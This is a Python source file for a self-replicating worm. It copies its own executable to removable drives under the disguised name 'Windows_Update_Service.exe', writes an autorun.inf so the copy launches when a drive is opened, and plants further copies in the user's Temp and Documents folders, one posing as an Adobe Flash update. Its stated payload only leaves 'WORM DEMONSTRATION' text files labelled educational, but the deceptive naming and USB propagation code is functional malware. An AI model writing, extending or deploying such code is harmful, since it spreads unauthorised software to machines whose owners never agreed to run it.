import os
import shutil
import sys
from datetime import datetime

class BasicWorm:
    def __init__(self):
        # Check if running as EXE or Python script
        if getattr(sys, 'frozen', False):
            self.worm_name = "Windows_Update_Service.exe"  # More convincing name
            self.current_file = sys.executable  # Path to the EXE
        else:
            self.worm_name = os.path.basename(__file__)
            self.current_file = __file__
        
        self.infected_markers = []
        
    def spread_via_removable_drives(self):
        """Spread to USB drives"""
        print("[Worm] Scanning for removable drives...")
        
        drives = ['D:', 'E:', 'F:', 'G:', 'H:']
        
        for drive in drives:
            if os.path.exists(drive):
                try:
                    # Copy the EXE to USB with convincing name
                    dest_path = os.path.join(drive, "Windows_Update_Service.exe")
                    shutil.copy2(self.current_file, dest_path)
                    
                    # Create autorun.inf
                    autorun_content = '''[AutoRun]
open=Windows_Update_Service.exe
action=Run Windows Update Service
'''
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, 'w') as f:
                        f.write(autorun_content)
                        
                    print(f"[Worm] Infected removable drive: {drive}")
                    self.infected_markers.append(drive)
                    
                except Exception as e:
                    print(f"[Worm] Failed to infect {drive}: {e}")
    
    def replicate_self(self):
        """Copy itself to multiple locations"""
        locations = [
            os.path.expanduser("~/AppData/Local/Temp/Windows_Update_Service.exe"),
            os.path.expanduser("~/Documents/Adobe_Flash_Update.exe"),
        ]
        
        for location in locations:
            try:
                shutil.copy2(self.current_file, location)
                print(f"[Worm] Replicated to: {location}")
            except Exception as e:
                print(f"[Worm] Failed to replicate to {location}: {e}")
    
    def execute_payload(self):
        """Create message files"""
        message_content = f"""⚠️  WORM DEMONSTRATION ⚠️

This computer ran a worm demonstration.

File: {self.worm_name}
Time: {datetime.now()}
Infected Locations: {len(self.infected_markers)}

This is for educational purposes only.
"""
        
        message_locations = [
            os.path.expanduser("~/Desktop/WORM_DEMO.txt"),
            os.path.expanduser("~/Documents/WORM_DEMO.txt"),
        ]
        
        for msg_path in message_locations:
            try:
                with open(msg_path, 'w', encoding='utf-8') as f:
                    f.write(message_content)
                print(f"[Worm] Message left at: {msg_path}")
            except Exception as e:
                print(f"[Worm] Failed to create message: {e}")
    
    def start_spreading(self):
        print("[Worm] Starting propagation...")
        self.replicate_self()
        self.spread_via_removable_drives()
        self.execute_payload()
        print(f"[Worm] Complete. Infected: {len(self.infected_markers)} targets")

if __name__ == "__main__":
    worm = BasicWorm()
    worm.start_spreading()